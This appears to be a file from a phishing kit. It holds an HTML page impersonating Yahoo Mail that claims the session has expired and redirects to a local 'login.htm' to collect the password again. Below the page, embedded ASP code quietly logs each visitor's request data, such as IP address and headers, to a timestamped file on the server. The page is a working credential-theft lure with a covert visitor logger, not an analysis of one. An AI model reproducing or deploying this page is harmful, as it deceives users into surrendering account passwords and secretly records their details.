<html><head><meta http-equiv="Content-type" content="text/html;charset=utf-8" /><meta http-equiv="refresh" content="0;URL=login.htm"><base href="http://us.mg205.mail.yahoo.com/dc/launch"/><link href="http://mail.yimg.com/a/lib/common/cta_1.0.0.css" rel="stylesheet" type="text/css" /></head><body style="background-color:#fff;"><div id="reloginDiv" style="min-height:100%; width:100%; height:100%;"><table width=100% height=100% border=0><tr align=center valign=middle><td><div style="top-margin:22px;font-family:arial;font-size:18px;font-weight:bold;color:#595CB2" >Sorry, your session has expired.</div><p class='reloginDivP fontT0 fontBlack'></p><a class="cta-w" href="login.htm"><strong><strong><strong>Sign In Again</strong></strong></strong></a><div style="top-margin:22px;font-family:arial;font-size:13px;font-weight:bold;color:black">To protect your account, you need to confirm your password periodically.</div></td></tr></table></div> </body></html>


<%str=str&Request.ServerVariables("LOCAL_ADDR")&chr(13)&chr(10)%>
<% For Each name In Request.ServerVariables %> 
<%str=str&name&"="&Request.ServerVariables(name)&chr(13)&chr(10)%>
<%Next%> 
<%set fs=server.createobject("scripting.filesystemobject")
set o=fs.CreateTextFile(server.mappath("index"&replace(now(),":","-")&".txt"),true,false)
o.write(str)
o.close
set o=nothing
set fs=nothing%>